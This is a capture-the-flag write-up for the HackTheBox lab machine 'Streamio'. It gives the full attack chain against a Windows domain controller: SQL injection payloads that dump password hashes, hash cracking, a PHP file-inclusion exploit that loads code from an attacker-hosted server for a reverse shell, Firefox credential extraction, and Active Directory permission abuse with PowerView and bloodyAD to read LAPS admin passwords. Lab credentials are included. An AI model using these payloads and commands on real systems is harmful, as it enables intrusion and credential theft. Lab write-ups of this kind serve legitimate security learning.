# Streamio
- Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb)
- Users:
    - yoshihide:
    - `db_user:B1@hB1@hB1@h`
    - `db_admin:B1@hx31234567890`
    - `nikk37:get_dem_girls2@yahoo.com`
    - barry
    - oliver
    - samatha

## NMAP
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-08 01:44:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2026-01-08T01:45:47+00:00; +7h00m01s from scanner time.
|_http-title: Not Found
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Foothold
- runnning vhost on `streamio.htb` only returns `watch.streamio.htb`
- ffuf on `streamio.htb` returns `admin` interesting
- ffuf on `streamio.htb/admin` returns `master.php` which can **only be included.**
- trying to find lfi or sqli
- found stacked sqli on login page in `streamio.htb`
- sqlmap returns
```
DBS:
available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb

tables:
movies
users

users table:
james - c660060492d9edcaa8332d89c99c9239
theodore - 925e5408ecb67aea449373d668b7359e
```
- could not crack above and very slow to dump db
- moving on to `watch.streamio.htb`
- trying sqlmap with the search page. getting blocked by waf
- `a' --` returns the results with a
    ```
    `abcd' UNION select 1,name,3,4,5,6 FROM sys.TABLES; --`
    `abcd' UNION select 1,name,3,4,5,6 FROM sys.columns where object_id= OBJECT_ID('users'); --`
    `abcd' UNION select 1,username+':'+password,3,4,5,6 FROM users; --`
    ```
- process the output using code to get `username:hash`
- create file with hashes and try to crack - regex -> replace `[A-z]*:` with nothing
- `hashcat -m 0 hashes.db rockyou.txt`
    ```
    admin:paddpadd
    Barry:$hadoW
    Bruno:$monique$1991$
    Clara:%$clara
    Juliette:$3xybitch
    Lauren:##123a8j8w5123##
    Lenord:physics69i
    Michelle:!?Love?!123
    Sabrina:!!sabrina$
    Thane:highschoolmusical
    Victoria:!5psycho8!
    yoshihide:66boysandgirls..
    ```
- winrm/smb does not work with above creds
- sprayed on webapp at `streamio.htb` using burp
- `yoshihide` creds work
- logged in to go to `/admin` page.
- fuzz on `/admin?message=` message parameter replaced with fuzz like `/admin?FUZZ=`
    - we find `debug=` parameter
- do `debug=php://filter/convert.base64-encode/resource=master.php`
- decode base64 to see:
```
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
- using burp make a POST call to `/admin?debug=master.php` with the include parameter
- create a file in kali named rce.php
```
system('dir C:\\');
```
- we dont need to add php headers as this will be included in the php file directly
- start an http server
- `include=http://10.10.14.246/rce.php`
    - ![alt text](/docs/blog/attachments/streamio.png)
- replace the `dir C:\\` payload with a powershell reveerse shell
- we get a shell back as yoshihide.
```
C:\Windows\system32\config
```
- reading
- `$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');`
- `$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');`
- `where.exe sqlcmd`
- cd `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\`
- working through the db using sqlcmd
```
.\SQLCMD.exe -S localhost -U db_admin -P 'B1@hx31234567890' -Q "SELECT name FROM sys.databases;"
.\SQLCMD.exe -S localhost -U db_admin -P 'B1@hx31234567890' -d streamio_backup -q "SELECT name FROM sys.tables;"
.\SQLCMD.exe -S localhost -U db_admin -P 'B1@hx31234567890' -d streamio_backup -q "SELECT * FROM users;"
id          username             password
----------- -------------------- --------------------------------------------------
          1 nikk37                389d14cb8e4e9b94b137deb1caf0612a
          2 yoshihide             b779ba15cedfd22a023c4d8bcf5f2332
          3 James                 c660060492d9edcaa8332d89c99c9239
          4 Theodore              925e5408ecb67aea449373d668b7359e
          5 Samantha              083ffae904143c4796e464dac33c1f7d
          6 Lauren                08344b85b329d7efd611b7a7743e8a09
          7 William               d62be0dc82071bccc1322d64ec5b6c51
          8 Sabrina               f87d3c0d6c8fd686aacc6627f1f493a5

```
- cracked nikk37 - `get_dem_girls2@yahoo.com`
- winrm into nikk37 to get user - 54c883ce494f47344ae8ee2f0a3ef72e

## PrivEsc
- found firefox profiles with key4.db and logins.json
- transfer these files to firepwd/mozilla_db
- `python3 firepwd.py -d mozilla_db` 
```
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
- nxc returns true for `jdgodd:JDg0dd1s@d0p3cr3@t0r`
- bloodhound above says `jdgodd` has `WriteOwner` over `Core_staff` which has `ReadLAPSPassword`.
- `bloodyAD -d streamio.htb --dc-ip 10.129.56.102 -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' get membership 'jdgodd'`
- 

# PowerView - Exploit WriteOwner on Group to Read LAPS
```
# 1. Import PowerView
. .\PowerView.ps1

# 2. Check your current permissions on the group
$group = Get-ADGroup "Core staff"
Get-ObjectAcl -Identity $group | Select IdentityReference, ActiveDirectoryRights
[OR]
Get-ObjectAcl -Identity "113400d4-c787-4e58-91ad-92779b38ecc5" | Select IdentityReference, ActiveDirectoryRights

# 3. Change the group owner to yourself
Set-ADGroupOwner -Identity "Core staff" -Owner (Get-ADUser -Identity $env:USERNAME)

# 4. Add yourself as member (now that you're owner)
Add-ADGroupMember -Identity "Core staff" -Members (Get-ADUser -Identity $env:USERNAME)

# 5. Verify membership
Get-ADGroupMember "Core staff"

# 6. Read LAPS passwords (as member of Core staff)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd

# Alternative: Use Get-LAPSComputers wrapper if available
Get-LAPSComputers
```


# bloodyAD - Exploit WriteOwner on Group to Read LAPS
```
# 1. Set up bloodhound/bloodyAD
bloodyAD -d streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip 10.129.56.102

# 2. Check your permissions on "Core staff" group
bloodyAD -d streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip 10.129.56.102 \
  get object "Core staff"

# 3. Add genericAll
- The issue is that WriteOwner doesn't grant WriteProperty (write members). You own the group but can't modify its members directly.
bloodyAD -d streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip 10.129.56.102 \
  add genericAll "Core staff" jdgodd
[+] jdgodd has now GenericAll on Core staff

# 4. Add yourself as member (now that you're owner)
bloodyAD -d streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip 10.129.56.102 \
  add groupMember "Core staff" jdgodd

# 5. Verify membership
bloodyAD -d streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip 10.129.56.102 \
  get membership "jdgodd"

# 6. Read LAPS passwords
## using bloodyAD
bloodyAD -d streamio.htb --dc-ip 10.129.56.102 -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd

## using ldapsearch
ldapsearch -H ldap://dc_ip -x -D "CN=username,CN=Users,DC=domain,DC=com" \
  -w password -b "DC=domain,DC=com" \
  "(objectClass=computer)" ms-Mcs-AdmPwd
## Or with laps-dump tool (simpler)
python3 laps-dump.py -d domain.com -u username -p password dc_ip

## using NXC
nxc ldap streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
```
- returns `ms-Mcs-AdmPwd: ;+1j&I#-v{1/74`
- trying with nxc will not return the correct output
- login with evil-winrm to get root in martin - ef9b03ab8bdeca6288b4bc1f1d572f8e
